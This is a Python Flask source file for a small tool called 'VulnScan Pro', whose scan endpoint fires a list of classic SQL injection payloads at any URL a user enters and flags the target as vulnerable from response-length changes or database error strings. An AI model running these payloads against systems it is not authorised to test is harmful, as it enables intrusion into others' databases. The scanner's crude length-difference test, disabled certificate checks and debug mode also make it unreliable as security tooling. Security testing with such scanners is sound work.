from flask import Flask, request, jsonify, send_from_directory
import requests as req

app = Flask(__name__, static_folder='static')

payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "' OR ''='",
    "' OR 1=1#"
]

ERROR_KEYWORDS = [
    "sql syntax", "mysql_fetch", "ora-", "odbc driver",
    "sqlite_", "pg_query", "syntax error", "unclosed quotation"
]

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    url = data.get('url', '').strip()
    method = data.get('method', 'GET')
    timeout = int(data.get('timeout', 5))

    if not url:
        return jsonify({'error': 'No URL provided'}), 400

    results = []
    try:
        if method == 'GET':
            baseline = req.get(url, timeout=timeout, verify=False)
        else:
            baseline = req.post(url, data={'input': 'test'}, timeout=timeout, verify=False)
        normal_length = len(baseline.text)
    except Exception as e:
        return jsonify({'error': f'Baseline request failed: {str(e)}'}), 500

    for payload in payloads:
        try:
            if method == 'GET':
                response = req.get(url + payload, timeout=timeout, verify=False)
            else:
                response = req.post(url, data={'input': payload}, timeout=timeout, verify=False)

            diff = abs(normal_length - len(response.text))
            error_found = any(k in response.text.lower() for k in ERROR_KEYWORDS)
            vulnerable = diff > 50 or error_found

            results.append({
                'payload': payload,
                'diff': diff,
                'vulnerable': vulnerable,
                'error_keyword': error_found
            })
        except Exception as e:
            results.append({
                'payload': payload,
                'diff': 0,
                'vulnerable': False,
                'error': str(e)
            })

    return jsonify({'baseline': normal_length, 'results': results})


if __name__ == '__main__':
    print("\n  VulnScan Pro — Flask Backend")
    print("  http://localhost:5122\n")
    app.run(debug=True, port=5122)